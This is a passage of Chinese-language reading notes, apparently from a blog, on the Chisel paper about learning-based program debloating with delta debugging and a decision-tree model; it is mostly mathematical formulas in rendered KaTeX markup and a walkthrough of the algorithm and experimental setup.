stretchy="false">⟩</mo><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∏</mo><mrow><mn>1</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mi mathvariant="normal">∣</mi><mi>L</mi><mi mathvariant="normal">∣</mi></mrow></munder><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi mathvariant="script">M</mi><mo stretchy="false">(</mo><mi>L</mi><mi mathvariant="normal">/</mi><msub><mi>u</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{R}(\langle L,n\rangle) = \prod_{1\leq i\leq |L|}(1 - \mathcal{M}(L/u_i))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1968em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(⟨</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">⟩)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.566em;vertical-align:-1.516em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.809em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mrel mtight">≤</span><span class="mord mathnormal mtight">i</span><span class="mrel mtight">≤</span><span class="mord mtight">∣</span><span class="mord mathnormal mtight">L</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.516em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathcal">M</span><span class="mopen">(</span><span class="mord mathnormal">L</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span></span></span></eqn></section> 其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">u_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span></eq>的部分,即<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>R</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mo stretchy="false">⟨</mo><mi>L</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">⟩</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{R}(\langle L,n\rangle)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1968em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(⟨</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">⟩)</span></span></span></span></eq> 表示<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span></eq>在模型<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">M</mi></mrow><annotation encoding="application/x-tex">\mathcal{M}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal">M</span></span></span></span></eq>下为1-minimal的概率</li></ul></li><li><p>最后给定估计的转移和奖励函数 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>T</mi><mo>^</mo></mover><mo separator="true">,</mo><mover accent="true"><mi>R</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{T},\hat{R}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1412em;vertical-align:-0.1944em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span></span></span></span></eq>,我们的目标是找到最优策略 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi>π</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mi><munder><mo><mi>a</mi><mi>r</mi><mi>g</mi><mtext> </mtext><mtext> </mtext><mi>m</mi><mi>a</mi><mi>x</mi></mo><mrow><mi>a</mi><mo>∈</mo><mi>A</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></munder></mi><mi><munder><mo><mo>∑</mo></mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></munder></mi><mover accent="true"><mi>T</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mover accent="true"><mi>V</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mspace width="1em"><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mspace></mrow><annotation encoding="application/x-tex">\hat{\pi}(s) = \underset{a\in A(s)}{arg\,\, max}\underset{s&#x27;}{\sum} \hat{T}(s&#x27;|s,a) \hat{V}(s&#x27;) \quad (1) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.344em;vertical-align:-1.294em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.1146em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">A</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1604em;"><span></span></span></span></span></span></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.856em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op" style="position:relative;top:0em;">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.294em;"><span></span></span></span></span></span></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></eqn></section> 其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>V</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{V}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9468em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span></span></span></span></span></span></span></eq> 是在策略 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>π</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\pi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span></span></span></span></span></span></span></eq>下的期望价值和,其定义如下 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi>V</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mover accent="true"><mi>R</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>+</mo><mi>γ</mi><mi><munder><mo><mo>∑</mo></mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></munder></mi><mover accent="true"><mi>T</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mover accent="true"><mi>π</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mover accent="true"><mi>V</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mspace width="1em"><mo stretchy="false">(</mo><mn>0</mn><mo>≤</mo><mi>γ</mi><mo>≤</mo><mn>1</mn><mo stretchy="false">)</mo><mspace width="1em"><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mspace></mspace></mrow><annotation encoding="application/x-tex"> \hat{V}(s) = \hat{R}(s) + \gamma \underset{s&#x27;}{\sum} \hat{T}(s&#x27;|s,\hat{\pi}(s)) \hat{V}(s&#x27;) \quad (0\leq \gamma \leq 1) \quad (2) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1968em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1968em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.344em;vertical-align:-1.294em;"></span><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.856em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op" style="position:relative;top:0em;">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.294em;"><span></span></span></span></span></span></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">))</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span></span></eqn></section> 其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>V</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{V}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9468em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9468em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span><span style="top:-3.2523em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span></span></span></span></span></span></span></eq> 可以通过动态规划获得.</p><ul><li>根据该策略,由行为导致的状态转移和奖励 为被用于 改进估计值,这将继续优化政策.</li><li>在我们的评估中,我们发现当 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>γ</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\gamma = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></eq> 时 效果最好(即仅考虑即时奖励)</li></ul></li></ul><h3 id="4.3-%E9%9D%99%E6%80%81%E6%A8%A1%E5%9E%8B" tabindex="-1">4.3 静态模型</h3><p>我们描述了如何学习上述模型。我们的目标是使用该模型来预测给定程序 $ P $ 的 $ O§ $ 的概率。我们从程序去膨胀过程中收集的数据中学习模型。</p><ul><li><p><strong>特征表示</strong>:假设一个程序由 $ n $ 个元素组成 $ \langle u_1,…u_n \rangle $ , 每个 $ P $ 的子程序 $ P’ $ 被特点编码函数 $ F $ 编码成一个长度为 $ n $ 的二进制向量 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><msup><mi>P</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">⟨</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>b</mi><mi>n</mi></msub><mo stretchy="false">⟩</mo></mrow><annotation encoding="application/x-tex"> F(P&#x27;) = \langle b_1,...,b_n \rangle </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⟨</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">⟩</span></span></span></span></span></eqn></section> 其中 $ b_i = 1 $ 当且仅当 $ u_i \in P’ $,否则 $ b_i = 0 $.</p></li><li><p><strong>数据标记</strong>:每个特征向量被一个布尔值标记 $ \mathcal{O}§ $ ,表示该程序是否通过属性测试. 每个标记数据在DD过程中每次实验中进行收集</p></li><li><p><strong>模型学习</strong>:使用现成的监督学习模型如决策树,该算法在DD过程中说及特征向量和标记. 该模型可以预测 对于一个给定的特征向量 $ P $ 预测其标记 $ \mathcal{O}§ $ . 通过将 $ \mathcal{O} $ 替换为 $ \mathcal{M} $ , 我们可以定义近似版本的 $ \hat{T} , \hat{R}$</p></li></ul><h3 id="4.4-%E5%9F%BA%E4%BA%8E%E5%AD%A6%E4%B9%A0%E7%9A%84%E7%A8%8B%E5%BA%8Fdebloating" tabindex="-1">4.4 基于学习的程序Debloating</h3><ul><li>现在正式说明我们的方法<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(3)_5.png" alt></li><li>入参:<ul><li><ol><li>原始程序 $ P $ 和属性测试函数 $ O $</li></ol></li><li><ol start="2"><li>一个现成的监督学习方法 $ \mathcal{L} $ ,用于学习模型</li></ol></li><li><ol start="3"><li>一个特征编码函数 $ F $ ,用于将程序编码为特征向量</li></ol></li></ul></li><li>算法解析<ul><li>第2行,状态 $ s $ 初始化为原始程序</li><li>第3行,数据集 $ D $ 初始化为 原始程序的特征向量和其标签(T) 的二元组</li><li>第4-13行为主循环,直至程序不能再分割<ul><li>第5行更新数据集</li><li>第6行计算当前模型得到的策略</li><li>第7行根据策略选择下一个状态</li><li>第8行检查属性测试是否通过</li><li>第9行:当前状态通过属性测试 或 需要更细粒度划分程序的时候,改变当前状态,</li><li>第12行:属性测试结果添加到数据集中</li></ul></li></ul></li></ul><h2 id="5-%E8%AF%84%E4%BC%B0" tabindex="-1">5 评估</h2><ul><li><strong>Q1. Effectiveness</strong>:debloating的质量和时间</li><li><strong>Q2. Security</strong>:是否移除的缺陷和攻击面的减少</li><li><strong>Q3. Robustness</strong>:对未见过输入的鲁棒性</li></ul><h3 id="5.1-%E5%AE%9E%E9%AA%8C%E8%AE%BE%E7%BD%AE" tabindex="-1">5.1 实验设置</h3><ul><li><strong>实施</strong>:<ul><li>我们将Chisel作为C程序的简化器,采用了基于语法引导的分层增量调试法(Delta-Debugging)<ul><li>Chisel首先使用标准的增量调试法简化全局级组件(全局变量声明,类型定义,函数定义等)</li><li>随后递归的再局部级组件(赋值,循环体,条件语句等)</li><li>局部级简化完成或,Chisel重新调用全局级简化，并继续整个过程直到找到一个最小版本</li><li>同时,Chisel通过简单的依赖分析,拒接无用的程序(如缺失主函数等)</li></ul></li><li>Chisel由2361行OCaml代码组成。我们使用FastDT3的现成决策树算法来学习模型。我们使用精确的决策树（即不使用提升/袋装法，也不限制树的最大深度）。所有实验在3.0 GHz和128 GB内存的Linux机器上进行</li></ul></li><li><strong>基准 